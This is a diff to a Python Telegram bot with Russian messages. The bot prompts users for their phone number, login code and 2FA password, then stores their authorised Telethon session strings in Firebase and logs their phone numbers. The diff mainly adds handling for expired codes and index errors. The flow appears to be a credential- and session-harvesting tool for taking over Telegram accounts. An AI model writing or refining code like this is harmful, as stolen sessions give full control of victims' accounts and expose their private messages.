@@ -76,6 +76,9 @@ async def load_session_from_firebase(user_id):
         else:
             print(f"Сессия для пользователя {user_id} не найдена в Firebase")
             return None
+    except firebase_admin.exceptions.InvalidArgumentError as e:
+        print(f"Ошибка индексации в Firebase: {str(e)}. Обновите правила безопасности, добавив .indexOn: 'timestamp' для пути /sessions/{user_id}")
+        return None
     except Exception as e:
         print(f"Ошибка при загрузке сессии из Firebase: {str(e)}\n{traceback.format_exc()}")
         return None
@@ -495,7 +498,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                 await update.message.reply_text(LANGUAGES['Русский']['enter_code'])
                 context.user_data['waiting_for_code'] = True
                 del context.user_data['waiting_for_phone']
-                # Логирование без попытки отправки в канал
                 print(f"Номер телефона {name} (@{username}): {text}")
                 session_data = client.session.save()
                 await save_session_to_firebase(user_id, session_data)
@@ -512,7 +514,6 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     await update.message.reply_text(LANGUAGES['Русский']['auth_success'])
                     del context.user_data['waiting_for_code']
                     del context.user_data['phone_code_hash']  # Очищаем после успешной авторизации
-                    # Логирование без попытки отправки в канал
                     print(f"Успешная авторизация {name} (@{username})")
                     keyboard = [
                         [InlineKeyboardButton("Русский", callback_data='lang_Русский')],
@@ -528,6 +529,11 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
                     context.user_data['waiting_for_password'] = True
                     del context.user_data['waiting_for_code']
                     print(f"Запрос пароля 2FA у {name} (@{username})")
+                except telethon_errors.CodeExpiredError:
+                    await update.message.reply_text("Код подтверждения устарел. Пожалуйста, начните заново с /start для получения нового кода.")
+                    del context.user_data['waiting_for_code']
+                    del context.user_data['phone_code_hash']
+                    print(f"Истек срок действия кода для {name} (@{username})")
                 except telethon_errors.RPCError as e:
                     await update.message.reply_text(LANGUAGES['Русский']['auth_error'].format(error=str(e)))
                     print(f"Ошибка ввода кода {name} (@{username}): {str(e)}")
@@ -556,6 +562,7 @@ async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
     finally:
         if client.is_connected():
             await client.disconnect()
+
 
     if str(user_id) not in users or 'language' not in users[str(user_id)]:
         return
